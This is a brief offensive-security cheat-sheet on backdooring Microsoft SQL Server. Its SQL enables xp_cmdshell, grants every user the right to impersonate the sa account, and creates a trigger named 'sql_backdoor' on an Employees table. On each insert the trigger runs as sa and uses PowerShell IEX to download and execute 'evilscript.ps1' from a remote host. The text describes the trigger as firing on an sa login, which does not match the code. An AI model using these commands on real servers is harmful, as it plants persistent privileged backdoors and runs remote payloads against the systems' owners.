# MSSQL xp_cmdshell

tags: #mssql #database #backdoor

Enable xp_cmdshell

```sql
sp_configure 'Show Advanced Options',1;
RECONFIGURE;
GO

sp_configure 'xp_cmdshell',1;
RECONFIGURE;
GO
```

Grants all users to impersonate the sa account
```sql
USE master

GRANT IMPERSONATE ON LOGIN::sa to [Public];
```

```sql
USE HRDB
```

Create a Trigger for executing powershell when a login occurs of the sa account

```sql
CREATE TRIGGER [sql_backdoor]
ON HRDB.dbo.Employees 
FOR INSERT AS

EXECUTE AS LOGIN = 'sa'
EXEC master..xp_cmdshell 'Powershell -c "IEX(New-Object net.webclient).downloadstring(''http://10.2.54.106:9000/evilscript.ps1'')"';
```
